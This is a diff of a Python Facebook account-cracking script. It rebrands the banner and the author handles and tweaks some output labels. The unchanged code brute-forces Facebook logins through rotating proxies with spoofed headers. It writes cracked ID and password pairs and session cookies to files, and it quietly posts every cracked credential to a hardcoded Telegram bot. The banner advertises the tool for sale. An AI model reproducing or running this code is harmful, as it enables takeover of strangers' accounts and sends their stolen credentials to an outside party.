@@ -130,16 +130,11 @@ def back():
 def banner():
 	clear()
 	alvino_xy(f'''\t{asu} ______                                              
-  ██████╗  ██████╗  ██████╗ ██╗  ██╗███╗   ███╗ ██╗██╗  ██╗
-           ██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝████╗ ████║███║╚██╗██╔╝
-           ██████╔╝██║   ██║██║   ██║█████╔╝ ██╔████╔██║╚██║ ╚███╔╝
-           ██╔══██╗██║   ██║██║   ██║██╔═██╗ ██║╚██╔╝██║ ██║ ██╔██╗
-           ██║  ██║╚██████╔╝╚██████╔╝██║  ██╗██║ ╚═╝ ██║ ██║██╔╝ ██╗
-           ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═╝╚═╝  ╚═╝                                       
+                                       
 =====================================================                                       
    \033[36m[ Author ] ≫ ROOK➳︎BRIGHT OKENWA➳︎BRIGHT
-   \033[31m[ Github ] ≫ ROOMCRACKEr
-   \033[36m[ TELEGRAM ] ≫ @@NQ_PI
+   \033[31m[ Github ] ≫ shaba_shelbe   @JG_HAMAE
+   \033[36m[ TELEGRAM ] ≫ @JG_shaba    @JG_HAMAE
    \033[31m[ $$$ ] ≫ TOOL 5$ FOOR EVER !!!
    \033[36m[ $$$ ] ≫ TOOL OPENSOURCE 10$ !!!!! 
                                                 
@@ -763,7 +758,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([u,u,u])
-	sys.stdout.write(f"\r 〔DYNO〕 {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} - {P}\033[1;31mCP - {cp}{x} - {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
+	sys.stdout.write(f"\r 〔shaba〕 {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} - {P}\033[1;31mCP - {cp}{x} - {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
 	sys.stdout.flush()
 	xx = open('.prox.txt','r').read().splitlines()
 	nip=random.choice(prox)
@@ -779,7 +774,7 @@ def crack(idf,pwv):
 			ses.headers.update({"Host":'d.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{x}\033[35m[ 😔 ] ID-CP × : {idf} [ 😢 ] PASS-CP × : {pw}')     
+				print(f'\r{x}\033[35m[ 🙂] ID-CP × : {idf} [ 🙂 ] PASS-CP × : {pw}')     
 				requests.get(f"https://api.telegram.org/bot5692156111:‌6187289493:AAFEe87L8t83lJfe3wLvIuMLOLADKPQu3nw-0/sendMessage?chat_id=5587846639&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 CP \n➳ Email  :  : {idf} \n│   ⊛  PASS  : {pw}  ")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -789,7 +784,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{x}\033[36m[ 😂√ ] ID-OK√ : {idf}\n[ 😂√ ] PASS-OK√ : {pw}\n[ ==>😆 ] COOKIES  : {kuki}')
+				print(f'\r{x}\033[36m[ 🤑√ ] ID-OK√ : {idf}\n[ 🤑√ ] PASS-OK√ : {pw}\n[ ==>😆 ] COOKIES  : {kuki}')
 				requests.get(f"https://api.telegram.org/bot5692156111:6187289493:AAFEe87L8t83lJfe3wLvIuMLOLADKPQu3nw-0/sendMessage?chat_id=5587846639&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 OK \n➳ Email  :  : {idf} \n│   ⊛  PASS  : {pw}  ")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				cek_apk(session,coki)
